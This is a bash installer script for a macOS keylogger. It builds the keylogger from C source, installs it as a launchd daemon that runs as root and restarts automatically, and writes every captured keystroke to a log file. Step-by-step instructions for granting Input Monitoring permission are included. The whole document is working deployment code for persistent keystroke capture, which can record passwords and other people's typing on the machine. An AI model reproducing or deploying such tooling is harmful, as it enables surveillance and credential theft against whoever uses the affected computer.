#!/usr/bin/env bash
# setup.sh — one-command installer for the macOS system keylogger
# Usage:  bash setup.sh          (builds + installs + loads daemon)
#         bash setup.sh uninstall (removes everything)
set -euo pipefail

BIN=/usr/local/bin/keylog
PLIST=/Library/LaunchDaemons/com.ollie.keylog.plist
LOG="$HOME/Downloads/keylog.log"
SRC="$(cd "$(dirname "$0")" && pwd)/keylogger.macos.c"

uninstall() {
    echo "[*] uninstalling..."
    sudo launchctl unload "$PLIST" 2>/dev/null || true
    sudo rm -f "$PLIST" "$BIN" "$LOG"
    echo "[+] done. (Input Monitoring entry in Settings can be removed manually.)"
    exit 0
}

if [ "${1:-}" = "uninstall" ]; then uninstall; fi

# --- checks ---
if ! command -v clang >/dev/null 2>&1; then
    echo "[!] clang not found. Run:  xcode-select --install"
    exit 1
fi
if [ ! -f "$SRC" ]; then
    echo "[!] keylogger.macos.c not found next to this script."
    exit 1
fi

echo "[*] building (arm64 native)..."
BUILD_OUT="$(mktemp "${TMPDIR:-/tmp}/keylog.XXXXXX")"
rm -f "$BUILD_OUT"
clang -O2 -o "$BUILD_OUT" "$SRC" -framework IOKit -framework CoreFoundation
file "$BUILD_OUT"

echo "[*] installing binary -> $BIN"
sudo mkdir -p /usr/local/bin
sudo cp "$BUILD_OUT" "$BIN"
sudo chmod 755 "$BIN"
rm -f "$BUILD_OUT"

echo "[*] writing launchd plist -> $PLIST"
sudo tee "$PLIST" >/dev/null <<EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key><string>com.ollie.keylog</string>
    <key>ProgramArguments</key>
    <array>
        <string>$BIN</string>
        <string>-o</string>
        <string>$LOG</string>
    </array>
    <key>RunAtLoad</key><true/>
    <key>KeepAlive</key><true/>
    <key>UserName</key><string>root</string>
</dict>
</plist>
EOF

echo "[*] loading daemon..."
sudo launchctl unload "$PLIST" 2>/dev/null || true
sudo launchctl load "$PLIST"

echo
echo "============================================================"
echo "  BUILD + INSTALL DONE."
echo "============================================================"
echo
echo "ONE MANUAL STEP LEFT — grant Input Monitoring:"
echo "  1. Open System Settings -> Privacy & Security -> Input Monitoring"
echo "  2. Click '+' and add:  $BIN"
echo "  3. Toggle it ON"
echo "  (If it's not listed, run:  sudo $BIN -o /tmp/test.log"
echo "   type a few keys, Ctrl+C, then add it in Settings.)"
echo
echo "Then verify:   tail -f $LOG"
echo "Uninstall:     bash setup.sh uninstall"
echo "============================================================"